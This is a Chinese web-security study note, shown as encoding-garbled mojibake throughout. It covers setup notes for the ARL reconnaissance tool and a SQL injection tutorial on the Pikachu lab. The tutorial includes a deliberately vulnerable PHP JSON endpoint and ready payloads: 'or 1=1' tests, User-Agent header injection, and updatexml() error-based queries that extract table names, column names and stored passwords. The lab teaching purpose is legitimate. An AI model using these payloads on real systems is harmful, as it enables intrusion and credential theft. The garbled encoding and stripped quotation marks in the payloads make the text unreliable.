æ•°æ®åº“è·¯å¾„ä¿¡æ¯ FOFA FOFA API é…ç½®ä¿¡æ¯ DINGDING é’‰é’‰æ¶ˆæ¯æ¨é€é…ç½® EMAIL é‚®ç®±å‘é€é…ç½® GITHUB.TOKEN GITHUB æœç´¢ TOKEN ARL.AUTH æ˜¯å¦å¼€å¯è®¤è¯ï¼Œä¸å¼€å¯æœ‰å®‰å…¨é£é™© ARL.API_KEY arlåç«¯APIè°ƒç”¨keyï¼Œå¦‚æœè®¾ç½®äº†è¯·æ³¨æ„ä¿å¯† ARL.BLACK_IPS ä¸ºäº†é˜²æ­¢SSRFï¼Œå±è”½çš„IPåœ°å€æˆ–è€…IPæ®µ ARL.PORT_TOP_10 è‡ªå®šä¹‰ç«¯å£ï¼Œå¯¹åº”å‰ç«¯ç«¯å£æµ‹è¯•é€‰é¡¹ ARL.DOMAIN_DICT åŸŸåçˆ†ç ´å­—å…¸ï¼Œå¯¹åº”å‰ç«¯å¤§å­—å…¸é€‰é¡¹ ARL.FILE_LEAK_DICT æ–‡ä»¶æ³„æ¼å­—å…¸ ARL.DOMAIN_BRUTE_CONCURRENT åŸŸåçˆ†ç ´å¹¶å‘æ•°é…ç½® ARL.ALT_DNS_CONCURRENT ç»„åˆç”Ÿæˆçš„åŸŸåçˆ†ç ´å¹¶å‘æ•° PROXY.HTTP_URL HTTPä»£ç†URLè®¾ç½® 8ï¼Œå¿˜è®°å¯†ç é‡ç½®å½“å¿˜è®°äº†ç™»å½•å¯†ç ï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œç„¶åä½¿ç”¨ admin/admin123 å°±å¯ä»¥ç™»å½•äº†ã€‚ docker exec -ti arl_mongodb mongo -u admin -p adminuse arldb.user.drop()db.user.insert( username: admin, password: hex_md5(arlsalt!@#+admin123) ) 9ï¼Œæºç å®‰è£…ä»…ä»…é€‚é…äº† centos 7 ï¼Œä¸”ç¯å¡”å®‰è£…ç›®å½•ä¸ºoptARLå¦‚æœåœ¨å…¶ä»–ç›®å½•å¯ä»¥åˆ›å»ºè½¯è¿æ¥ï¼Œä¸”å®‰è£…äº†å››ä¸ªæœåŠ¡åˆ†åˆ«ä¸ºarl-web, arl-worker, arl-worker-github, arl-scheduler wget https://raw.githubusercontent.com/TophantTechnology/ARL/master/misc/setup-arl.shchmod +x setup-arl.sh./setup-arl.sh 10ï¼ŒDocker ç¯å¢ƒå®‰è£…ä»…ä»…é€‚é…äº† centos 7 ï¼Œä¸”ç¯å¡”å®‰è£…ç›®å½•ä¸ºoptARL wget https://raw.githubusercontent.com/TophantTechnology/ARL/master/misc/setup-docker-arl.shchmod +x setup-docker-arl.sh./setup-docker-arl.sh 11ï¼ŒFAQè¯·è®¿é—®å¦‚ä¸‹é“¾æ¥FAQ ä¹ï¼Œwebåå¤§æ¼æ´9-1 SQLæ³¨å…¥æ¼æ´ 1ï¼Œå¸¸ç”¨çš„ç®€å•æµ‹è¯•è¯­å¥å’Œæ³¨é‡Šç¬¦å·è¯´æ˜sqlè¯­å¥çš„æ³¨é‡Šç¬¦å·ä¹Ÿæ˜¯sqlæ³¨å…¥è¯­å¥çš„å…³é”®ç‚¹ï¼šå¸¸ç”¨ # ã€ â€“ ã€‚ 1ã€# å’Œ -- (æœ‰ä¸ªç©ºæ ¼)è¡¨ç¤ºæ³¨é‡Šï¼Œå¯ä»¥ä½¿å®ƒä»¬åé¢çš„è¯­å¥ä¸è¢«æ‰§è¡Œã€‚åœ¨urlä¸­ï¼Œå¦‚æœæ˜¯getè¯·æ±‚(è®°ä½æ˜¯getè¯·æ±‚)ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥çš„url ï¼Œè§£é‡Šæ‰§è¡Œçš„æ—¶å€™ï¼Œurlä¸­#å·æ˜¯ç”¨æ¥æŒ‡å¯¼æµè§ˆå™¨åŠ¨ä½œçš„ï¼Œå¯¹æœåŠ¡å™¨ç«¯æ— ç”¨ã€‚æ‰€ä»¥ï¼ŒHTTPè¯·æ±‚ä¸­ä¸åŒ…æ‹¬#ï¼Œå› æ­¤ä½¿ç”¨#é—­åˆæ— æ³•æ³¨é‡Šï¼Œä¼šæŠ¥é”™ï¼›è€Œä½¿ç”¨-- (æœ‰ä¸ªç©ºæ ¼)ï¼Œåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ç©ºæ ¼ä¼šè¢«å¿½ç•¥ï¼ŒåŒæ ·å¯¼è‡´æ— æ³•æ³¨é‡Šï¼Œæ‰€ä»¥åœ¨getè¯·æ±‚ä¼ å‚æ³¨å…¥æ—¶æ‰ä¼šä½¿ç”¨--+çš„æ–¹å¼æ¥é—­åˆï¼Œå› ä¸º+ä¼šè¢«è§£é‡Šæˆç©ºæ ¼ã€‚2.å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨--%20ï¼ŒæŠŠç©ºæ ¼è½¬æ¢ä¸ºurlencodeç¼–ç æ ¼å¼ï¼Œä¹Ÿä¸ä¼šæŠ¥é”™ã€‚åŒç†æŠŠ#å˜æˆ%23,ä¹Ÿä¸æŠ¥é”™ã€‚3.å¦‚æœæ˜¯postè¯·æ±‚ï¼Œåˆ™å¯ä»¥ç›´æ¥ä½¿ç”¨#æ¥è¿›è¡Œé—­åˆã€‚å¸¸è§çš„å°±æ˜¯è¡¨å•æ³¨å…¥ï¼Œå¦‚æˆ‘ä»¬åœ¨åå°ç™»å½•æ¡†ä¸­è¿›è¡Œæ³¨å…¥ã€‚4.ä¸ºä»€ä¹ˆ--åé¢å¿…é¡»è¦æœ‰ç©ºæ ¼ï¼Œè€Œ#åé¢å°±ä¸éœ€è¦ï¼Ÿ å› ä¸ºä½¿ç”¨--æ³¨é‡Šæ—¶ï¼Œéœ€è¦ä½¿ç”¨ç©ºæ ¼ï¼Œæ‰èƒ½å½¢æˆæœ‰æ•ˆçš„sqlè¯­å¥ï¼Œè€Œ#åé¢å¯ä»¥æœ‰ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ï¼Œsqlå°±æ˜¯è¿™ä¹ˆè§„å®šçš„ï¼Œè®°ä½å°±è¡Œäº†ã€‚ å› ä¸ºä¸åŠ ç©ºæ ¼ï¼Œ--ç›´æ¥å’Œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„å•å¼•å·è¿æ¥åœ¨äº†ä¸€èµ·ï¼Œä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå…³é”®è¯ï¼Œæ— æ³•æ³¨é‡Šæ‰ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„å•å¼•å·ã€‚ ç®€å•æµ‹è¯•è¯­å¥ï¼š ## å¼•å·æµ‹è¯•ï¼ŒåŠ äº†å¼•å·å¦‚æœæŠ¥é”™ï¼Œè¯æ˜å­˜åœ¨æ³¨å…¥ç‚¹å•å¼•å·é—­åˆæ•°æ®ï¼š$query=select id,email from member where username=vince; ## ç”¨å•å¼•å·æµ‹è¯•,ä¼šæŠ¥é”™ï¼ŒåŒå¼•å·æµ‹è¯•æŸ¥ä¸åˆ°æ•°æ®ï¼Œä¸æŠ¥é”™ åŒå¼•å·é—­åˆæ•°æ®ï¼š$query=select id,email from member where username=vince; ## ç”¨åŒå¼•å·æµ‹è¯•ï¼Œä¼šæŠ¥é”™ï¼Œå•å¼•å·æµ‹è¯•æŸ¥ä¸åˆ°æ•°æ®ï¼Œä¸æŠ¥é”™ or 1=1 # ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œå³ä¸ºçœŸï¼ŒçœŸçš„æ•ˆæœå°±æ˜¯æŸ¥è¯¢åˆ°è¡¨ä¸­æ‰€æœ‰æ•°æ®where id=1 and 1=1 ## ä¸¤ä¸ªæ¡ä»¶ä¸ºçœŸæ‰ä¸ºçœŸï¼ŒæŸ¥è¯¢ç»“æœå’Œä¸åŠ 1=1ä¸€æ ·ï¼Œand 1=2 ä¸€ä¸ªæ¡ä»¶ä¸ºå‡ï¼Œå³ä¸ºå‡ï¼ŒæŸ¥è¯¢æ¡ä»¶ä¸ºå‡ï¼Œä»€ä¹ˆæ•°æ®ä¹Ÿæ²¡æœ‰ï¼Œä¸¤ä¸ªç»“åˆèµ·æ¥å¯ä»¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ã€‚union select è”åˆæŸ¥è¯¢ # å…³ç³»å‹æ•°æ®åº“ rediséå…³ç³»å‹çš„æ˜¯ä¸èƒ½ç”¨union selectçš„ 2,sqlæ³¨å…¥åˆ†ç±»1,æ•°æ®ç±»å‹åˆ†ç±»## ä¸»è¦åˆ†ä¸ºå¦‚ä¸‹å››ç±»ï¼šæ•°å­—å‹ã€å­—ç¬¦å‹ã€æœç´¢å‹ã€xxå‹ 1ï¼Œæ•°å­—å‹æ•°å­—å‹æ³¨å…¥çš„æ—¶å€™ï¼Œæ˜¯ä¸éœ€è¦è€ƒè™‘å•\\åŒå¼•å·é—­åˆé—®é¢˜çš„ï¼Œå› ä¸ºsqlè¯­å¥ä¸­çš„æ•°å­—æ˜¯ä¸éœ€è¦ç”¨å¼•å·æ‹¬èµ·æ¥çš„ï¼Œå¦‚ä¸‹ mysql select username,email from member where id=1;mysql select username,email from member where id=1 or 1=1; æ³¨å…¥æˆåŠŸï¼Œçœ‹ä¸€ä¸‹åå°ä»£ç  æ³¨æ„ï¼šæˆ‘ä»¬åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—å‹æ³¨å…¥ï¼Œä¸æ˜¯é€šè¿‡å‰ç«¯é¡µé¢ä¸Šçœ‹åˆ°çš„æ•°æ®æ˜¯æ•°å­—å°±åˆ¤æ–­å®ƒæ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¼ªæ•°å­—å‹ï¼Œå› ä¸ºåå°å¤„ç†çš„æ—¶å€™å¯èƒ½æ˜¯å°†å‰ç«¯ä¼ é€’è¿‡æ¥çš„æ•°å­—é€šè¿‡å¼•å·æ‹¬èµ·æ¥äº†ï¼Œä¹Ÿå°±æ˜¯ä½œä¸ºäº†å­—ç¬¦ä¸²æ¥å¤„ç†ï¼Œæ‰€ä»¥è¦å¤šå°è¯•ã€‚ 2ï¼Œå­—ç¬¦å‹å­—ç¬¦ä¸²ç±»å‹çš„è¾“å…¥æ–¹å¼ select id,email from member where username=vince or 1=1; åœ¨ä¸çŸ¥é“æ•°æ®åº“ä¸­ç”¨æˆ·åçš„æƒ…å†µä¸‹ï¼Œè·å–æ‰€æœ‰ç”¨æˆ·æ•°æ® å¦‚æœä½ çš„éªŒè¯ä¸äº†ï¼Œè¾“å…¥å•å¼•å·çš„æ—¶å€™å‘ç°æ²¡æœ‰ç”¨ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯å› ä¸ºphpstudyçš„é­”æœ¯ç¬¦å·å¼€å¯äº†ï¼Œè¿™æ˜¯phpstudyçš„ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œæˆ‘ä»¬å…³é—­å®ƒ 3ï¼Œæœç´¢å‹## å›åˆ°pikachuå¹³å°,å°†æ‹¼æ¥è¯­å¥å†™ä¸º %xxxx% or 1=1 #% æˆ–è€… xxxx% or 1=1 #% éƒ½å¯ä»¥ åå°æ‹¼æ¥çš„sqlè¯­å¥ä¸ºï¼š select * from member where username like %%xxx% or 1=1; 4ï¼Œxxå‹ä½•ä¸ºxxå‹å‘¢ï¼Ÿå…ˆçœ‹åå°ä»£ç ï¼š XXå‹æ˜¯ç”±äºSQLè¯­å¥æ‹¼æ¥æ–¹å¼ä¸åŒï¼Œæ³¨å…¥è¯­å¥å¦‚ä¸‹ï¼š mysql select * from member where username=(vince) ï¼›mysql select * from member where username=(xx) or 1=1; å›åˆ°pikachuå¹³å°,å°†æ‹¼æ¥è¯­å¥å†™ä¸º XXâ€™) or 11# 5ï¼ŒJSONç±»å‹1ï¼Œjsonæ•°æ®çš„æ ¼å¼ï¼š## ç±»å‹ï¼š æ•°å­—ï¼ˆæ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼‰ age:30,xx:123 å­—ç¬¦ä¸²ï¼ˆåœ¨åŒå¼•å·ä¸­ï¼‰ uname:yang é€»è¾‘å€¼ï¼ˆtrue æˆ– falseï¼‰ flag:true æ•°ç»„ï¼ˆåœ¨ä¸­æ‹¬å·ä¸­ï¼‰sites:[name:yang,name:ming] å¯¹è±¡ï¼ˆåœ¨å¤§æ‹¬å·ä¸­ï¼‰JSON å¯¹è±¡åœ¨å¤§æ‹¬å·ï¼ˆï¼‰ä¸­ä¹¦å†™ï¼š null runoob:null ## æ³¨æ„ç‚¹ï¼šä¸‹é¢æ˜¯å‡ ä¸ªé”™è¯¯çš„æ ¼å¼ name: å¼ ä¸‰, age: 32 // å±æ€§åå¿…é¡»ä½¿ç”¨åŒå¼•å· name: å¼ ä¸‰, age: 32 //å±æ€§å€¼å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå¿…é¡»è¦åŒå¼•å·ï¼Œä¸èƒ½ç”¨å•å¼•å· [32, 64, 128, 0xFFF] // ä¸èƒ½ä½¿ç”¨åå…­è¿›åˆ¶å€¼ name: å¼ ä¸‰, age: undefined // ä¸èƒ½ä½¿ç”¨undefined ## æœ€åä¸€ç»„é”®å€¼å¯¹åé¢ä¸èƒ½æœ‰ç¬¦å·ï¼Œæ¯”å¦‚ä¸èƒ½æœ‰é€—å·äº†ã€‚ 2ï¼ŒJSONæ³¨å…¥phpstudyå·²ç»å®‰è£…è¿‡äº†ï¼Œä¸‹é¢æ˜¯phpæœåŠ¡ç«¯ä»£ç  ?php // phpé˜²æ­¢ä¸­æ–‡ä¹±ç  header(content-type:text/html;charset=utf-8); if(isset($_POST[json])) $json_str=$_POST[json]; $json=json_decode($json_str); if(!$json) die(JSONæ–‡æ¡£æ ¼å¼æœ‰è¯¯ï¼Œè¯·æ£€æŸ¥); $username=$json-username; //$password=$json-password; // å»ºç«‹mysqlè¿æ¥ï¼Œroot/rootè¿æ¥æœ¬åœ°æ•°æ®åº“ $mysqli=new mysqli(); $mysqli-connect(localhost,root,root); if($mysqli-connect_errno) die(æ•°æ®åº“è¿æ¥å¤±è´¥ï¼š.$mysqli-connect_error); // è¦æ“ä½œçš„æ•°æ®åº“åï¼Œæˆ‘çš„æ•°æ®åº“æ˜¯security $mysqli-select_db(pikachu); if($mysqli-errno) dir(æ‰“å¼€æ•°æ®åº“å¤±è´¥ï¼š.$mysqli-error); // æ•°æ®åº“ç¼–ç æ ¼å¼ $mysqli-set_charset(utf-8); // ä»usersè¡¨ä¸­æŸ¥è¯¢usernameï¼Œpasswordå­—æ®µ $sql=SELECT username,password FROM users WHERE username=$username; $result=$mysqli-query($sql); if(!$result) die(æ‰§è¡ŒSQLè¯­å¥å¤±è´¥ï¼š.$mysqli-error); else if($result-num_rows==0) die(æŸ¥è¯¢ç»“æœä¸ºç©º); else while($data=mysqli_fetch_assoc($result)) $username=$data[username]; $password=$data[password]; echo ç”¨æˆ·åï¼š$username,å¯†ç ï¼š$password; // é‡Šæ”¾èµ„æº $result-free(); $mysqli-close(); ? æ­£å¸¸æŸ¥è¯¢æ•ˆæœï¼š json=username:chao ç»“æœ æ³¨å…¥æŸ¥è¯¢ json=username:xx or 1=1 # ç»“æœ è¿™å°±æ˜¯jsonç±»å‹æ•°æ®çš„æ³¨å…¥ï¼Œè‡³äºä½ æƒ³é€šè¿‡è¿™ä¸ªæ³¨å…¥ç‚¹åšä»€ä¹ˆï¼Œå°±å¯ä»¥è‡ªè¡Œæ¥å†™ä¸€äº›è¾¾åˆ°ç›®çš„çš„æ³¨å…¥è¯­å¥äº† 2ï¼ŒSQLæ³¨å…¥æäº¤æ–¹å¼åˆ†ç±»GETã€POSTã€Cookieç­‰ æ³¨å…¥æäº¤æ–¹å¼çš„åˆ†ç±»ä¸»è¦æ˜¯æ ¹æ®åå°ä»£ç å¤„ç†è¯·æ±‚æ–¹æ³•çš„æ–¹å¼ ASPï¼šrequest ï¼ˆå…¨éƒ¨æ¥å—ï¼‰ã€request.querystring ï¼ˆæ¥å—getï¼‰ã€request.form ï¼ˆæ¥å—postï¼‰ã€request.cookie cookie ï¼ˆæ¥å—cookieï¼‰PHP: $_REQUESTï¼ˆå…¨éƒ¨æ¥å—ï¼‰ã€$_GET $_POST ï¼ˆæ¥å—postï¼‰ã€$_COOKIEï¼ˆæ¥å—cookieï¼‰#$_GETä¸æ˜¯å–getè¯·æ±‚æºå¸¦çš„æ•°æ®ï¼Œè€Œæ˜¯å–å¾—æŸ¥è¯¢å‚æ•°æ•°æ®å…¶ä»–è¯­è¨€ï¼Œçœ‹å¼€å‘æ¡†æ¶ï¼Œä¸åŒçš„æ¡†æ¶ï¼Œæå–httpè¯·æ±‚æ•°æ®çš„å†™æ³•æˆ–è€…è¯´å‡½æ•°ä¸åŒpython django -- mvc -- request.GET requset.POST request.body 3ï¼ŒSQLæ³¨å…¥è¯·æ±‚ä½ç½®åˆ†ç±»è¯·æ±‚è¡Œã€è¯·æ±‚å¤´ã€è¯·æ±‚æ•°æ®éƒ¨åˆ† å…¶å®è¿™ä¸ªä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ï¼Œæ‰€æœ‰æäº¤ç»™åå°çš„æ•°æ®ï¼Œåªè¦åå°ä½¿ç”¨è¿™ä¸ªæ•°æ®å’Œæ•°æ®åº“æ‰“äº¤é“ï¼Œé‚£ä¹ˆéƒ½å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ã€‚ æˆ‘ä»¬å°±çœ‹ä¸€ä¸‹è¯·æ±‚å¤´çš„å§ 1ï¼Œhttp headeræ³¨å…¥å…ˆåœ¨pikachuå¹³å°æ‰“å¼€Http Headeræ³¨å…¥æ¨¡å—ï¼Œç‚¹å‡»æç¤ºæŸ¥çœ‹ç™»å½•å¸å·å’Œå¯†ç ï¼Œç™»é™†åå»BurpSuiteä¸­æ‰¾åˆ°ç™»é™†åœ°GETè¯·æ±‚ï¼Œæ³¨æ„ï¼Œä¸æ˜¯ç‚¹å‡»ç™»å½•é‚£ä¸ªè¯·æ±‚ï¼Œè€Œæ˜¯ç™»å½•æˆåŠŸä¹‹ååŠ è½½é¡µé¢çš„é‚£ä¸ªgetè¯·æ±‚æ˜‚ï¼ŒæŠŠè¯·æ±‚å‘é€åˆ°Repeateræ¨¡å—ä¸­ï¼Œå»é™¤User-Agentï¼šï¼Œç„¶åè¾“å…¥â€™ ç„¶åè¿è¡Œåè§‚å¯ŸMYSQLè¯­æ³•æŠ¥é”™ç„¶åå‘ç°å­˜ åœ¨SQLæ³¨å…¥æ¼æ´ã€‚è¿™æ—¶å€™å¯ä»¥è®¾ç½®payloadã€‚åœ¨User-Agentè¾“å…¥payload Mozillaâ€™ or updatexml(1,concat(0x7e,database()),0) or â€˜ ï¼Œå› ä¸ºæœ‰äº›ä¼ä¸šæŠŠuser-agentç­‰è¯·æ±‚å¤´é”®å€¼å¯¹çš„æ•°æ®ä¹Ÿä¿å­˜åœ¨äº†æ•°æ®åº“é‡Œé¢ã€‚phpä¸“é—¨å–è¯·æ±‚å¤´æ•°æ®çš„ï¼Œä½¿ç”¨çš„æ–¹æ³•æ˜¯ $_SERVER[â€˜è¯·æ±‚å¤´é”®â€™]å°±èƒ½æ‹¿åˆ°å€¼ã€‚ å¥½ï¼Œæ¥ä¸‹æ¥ä¿®æ”¹è¿™ä¸ªåŒ…çš„user-agentï¼Œè¿›è¡Œæ³¨å…¥ ç»“æœå‡ºæ¥äº†ï¼Œæˆ‘ä»¬è‡ªå·±çœ‹ä¸€ä¸‹æºç å°±çŸ¥é“äº†ï¼Œuser-agentè‚¯å®šå’Œæ•°æ®åº“äº¤äº’äº† 4ï¼ŒæŠ¥é”™æ³¨å…¥åœ¨MYSQLä¸­ä½¿ç”¨ä¸€äº›æŒ‡å®šçš„å‡½æ•°æ¥åˆ¶é€ æŠ¥é”™,ä»è€Œä»æŠ¥é”™ä¿¡æ¯ä¸­è·å–è®¾å®šçš„ä¿¡æ¯ï¼Œå¸¸è§çš„selectinsertupdatedeleteæ³¨å…¥éƒ½å¯ä»¥ä½¿ç”¨æŠ¥é”™æ–¹å¼æ¥è·å–ä¿¡æ¯ã€‚ä¸ºä»€ä¹ˆè¦ç”¨å‡½æ•°æŠ¥é”™å‘¢ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬ä¸Šé¢å­¦åˆ°çš„ä¸€äº›æ³¨å…¥æµ‹è¯•æ‰‹æ®µï¼Œå¯èƒ½çœ‹ä¸åˆ°æŠ¥é”™ï¼Œè¢«å±è”½æˆ–è€…å¤„ç†äº†ï¼Œå°±ä¸å¥½åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å­¦ä¸€ä¸‹åŸºäºå‡½æ•°çš„æŠ¥é”™ã€‚ 1ï¼Œå¸¸ç”¨çš„æŠ¥é”™ä¿¡æ¯å‡½æ•°## Updatexml() :å‡½æ•°æ˜¯MYSQLå¯¹XMLæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„XPATHå‡½æ•°ã€‚## extractvalue() :å‡½æ•°ä¹Ÿæ˜¯MYSQLå¯¹XMLæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢çš„XPATHå‡½æ•°ã€‚## floor() :MYSQLä¸­ç”¨æ¥å–æ•´çš„å‡½æ•°ã€‚## å…¶å®å¯å®ŒæˆæŠ¥é”™æ³¨å…¥çš„mysqlå‡½æ•°æœ‰å¾ˆå¤šï¼Œå¤§æ¦‚æœ‰10å‡ ä¸ªï¼Œè¿™é‡Œæˆ‘å°±ä¸ä¸€ä¸€è¯´äº†ã€‚k and updatexml(1,concat(0x7e,(select database()),0x7e),2)#k and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)# 2ï¼Œå®æˆ˜æµ‹è¯•1ï¼Œçˆ†ç ´æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯k and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) # ## kè¿™ä¸ªå­—æ¯æ˜¯éšä¾¿å†™çš„æ˜‚ï¼Œå†™å•¥éƒ½è¡Œï¼Œ0x7eæ˜¯16è¿›åˆ¶ï¼Œè¡¨ç¤ºä¸€ä¸ª~ç¬¦å· k and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) # ## é‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆä¸ç›´æ¥å†™~ï¼Œè€Œæ˜¯å†™æˆäº†16è¿›åˆ¶å‘¢ï¼Œå› ä¸º~æœ¬èº«ä¸ºå­—ç¬¦ä¸²ï¼Œå¦‚æœç›´æ¥å†™~ï¼Œéœ€è¦ç”¨å¼•å·å¼•èµ·æ¥ï¼Œå¦‚æœç”¨å•å¼•å·çš„è¯ï¼ŒåŠ¿å¿…ä¼šå’Œæˆ‘ä»¬å‰é¢é—­åˆç”¨çš„å•å¼•å·æœ‰äº›å†²çªï¼Œæ‰€ä»¥åªèƒ½ç”¨åŒå¼•å·ï¼Œæ‰€ä»¥è¿˜éœ€è¦å†™å¼•å·ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œå¹¶ä¸”å¦‚æœåˆ«äººåå°å¯¹å¼•å·åšäº†é™åˆ¶çš„è¯ï¼Œæˆ‘ä»¬ç”¨å¼•å·å°±ä¼šæ³¨å…¥å¤±è´¥ã€‚k and updatexml(1,concat(~,(SELECT @@version),~),1) # ä¸Šé¢æ•´å¥è¯çš„æ„æ€æ˜¯ï¼Œæ‰§è¡Œupdatexmlå‡½æ•°ï¼ŒåŒ¹é…1è¿™ä¸ªæ•°æ®ä¸­ç¬¦åˆè¿™ä¸ªåŒ¹é…è§„åˆ™ æŠ¥é”™ï¼Œä½†æ˜¯çœ‹åˆ°äº†æ•°æ®åº“ç‰ˆæœ¬ã€‚ 2ï¼Œçˆ†ç ´æ•°æ®åº“å½“å‰ç”¨æˆ·k and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)# 3ï¼Œçˆ†ç ´æ•°æ®åº“k and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) # 4ï¼Œçˆ†è¡¨## 5.1ç‰ˆæœ¬åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œmysqlæ•°æ®åº“ä¸­ä¼šå­˜åœ¨ä¸€ä¸ªå«åšinformation_schemaçš„é»˜è®¤æ•°æ®åº“ï¼Œè¿™ä¸ªåº“é‡Œé¢è®°å½•ç€æ•´ä¸ªmysqlç®¡ç†çš„æ•°æ®åº“çš„åç§°ã€è¡¨åã€åˆ—å(å­—æ®µå).è·å–æ•°æ®åº“è¡¨åï¼Œè¾“å…¥ï¼škand updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu)),0)### ä½†æ˜¯åé¦ˆå›çš„é”™è¯¯è¡¨ç¤ºåªèƒ½æ˜¾ç¤ºä¸€è¡Œï¼Œæ‰€ä»¥é‡‡ç”¨limitæ¥ä¸€è¡Œä¸€è¡Œæ˜¾ç¤ºï¼Œçœ‹æŠ¥é”™ ## limité™åˆ¶ä¸€è¡Œï¼Œè¾“å…¥k and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu limit 0,1)),0)### æ›´æ”¹limitåé¢çš„æ•°å­—limit 0 å®Œæˆè¡¨åéå†ã€‚ 5,çˆ†å­—æ®µ## è·å–å­—æ®µåï¼Œè¾“å…¥ï¼šk and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=users and table_schema=pikachu limit 2,1)),0)# 6ã€çˆ†å­—æ®µå†…å®¹## è·å–å­—æ®µå†…å®¹ï¼Œè¾“å…¥ï¼šk and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)# ## è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ã€‚å¦‚æœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºNULL ï¼Œåˆ™è¿”å›å€¼ä¸º NULLã€‚## é€šè¿‡æŸ¥è¯¢@@version,è¿”å›ç‰ˆæœ¬ã€‚ç„¶åCONCATå°†å…¶å­—ç¬¦ä¸²åŒ–ã€‚å› ä¸ºUPDATEXMLç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpath æ ¼å¼çš„å­—ç¬¦ä¸²,æ‰€ä»¥ä¸ç¬¦åˆè¦æ±‚ï¼Œç„¶åæŠ¥é”™ã€‚ 5,sqlæ³¨å…¥æŸ¥è¯¢è¯­å¥åˆ†ç±»## selectã€deleteã€updateã€insertï¼Œä¹Ÿå°±æ˜¯å¢åˆ æ”¹æŸ¥ã€‚## selectä¸ç”¨å¤šè¯´ï¼Œå‰é¢ä¸€ç›´åœ¨ç”¨ã€‚## å…¶å®insert\\update\\deleteç­‰ä¹Ÿæ˜¯mysqlçš„å‡½æ•° 1ï¼Œinsertæ³¨å…¥è¿›å…¥pikachuç½‘ç«™æ³¨å†Œé¡µé¢ï¼Œå¡«å†™ç½‘ç«™æ³¨å†Œç›¸å…³ä¿¡æ¯ ç‚¹å‡»æ³¨å†Œï¼Œæ¥åˆ°æ³¨å†Œé¡µé¢ï¼Œè¾“å…¥æ³¨å†Œä¿¡æ¯ï¼Œç„¶åé€šè¿‡BurpæŠ“åŒ…åœ¨ç”¨æˆ·åè¾“å…¥ç›¸å…³payloadï¼Œæ ¼å¼å¦‚ä¸‹ï¼š æäº¤äº†è¿™ä¹ˆå¤šçš„æ•°æ®ï¼Œæ¯ä¸ªæ•°æ®éƒ½æœ‰å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªçš„æµ‹ï¼Œå¤ªç´¯äº†ï¼Œæ‰€ä»¥åé¢æˆ‘ä»¬ä¼šå­¦ä¸€äº›è‡ªåŠ¨åŒ–çš„å·¥å…·ã€‚ 1ï¼Œçˆ†è¡¨åjadenor updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu limit 0,1)),0) or 2ï¼Œçˆ†åˆ—å or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=users limit 2,1)),0) or 3ï¼Œçˆ†å†…å®¹ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) orç­‰åŒäº or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or 1=1 2ï¼Œupdateæ³¨å…¥ä¸insertæ³¨å…¥çš„æ–¹æ³•å¤§ä½“ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºupdateç”¨äºç”¨æˆ·ç™»é™†ç«¯(æˆ–è€…ä¿®æ”¹æ•°æ®çš„åœ°æ–¹)ï¼Œç™»å½•ç«¯ä¸€èˆ¬è¯´çš„æ˜¯ä¿®æ”¹æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´ç­‰ä¿¡æ¯ï¼Œinsertç”¨äºç”¨äºç”¨æˆ·æ³¨å†Œç«¯ã€‚ ä¸€èˆ¬ç™»å½•ç½‘ç«™å‰å°æˆ–åå°æ›´æ–°ç”¨æˆ·ä¿¡æ¯çš„åœ°æ–¹ï¼Œå¡«å†™ç”¨æˆ·éœ€è¦ä¿®æ”¹ç›¸å…³ä¿¡æ¯ï¼Œé€šè¿‡BurpæŠ“åŒ…åœ¨ç”¨æˆ·åè¾“å…¥ç›¸å…³payloadï¼Œæ ¼å¼å¦‚ä¸‹ï¼š 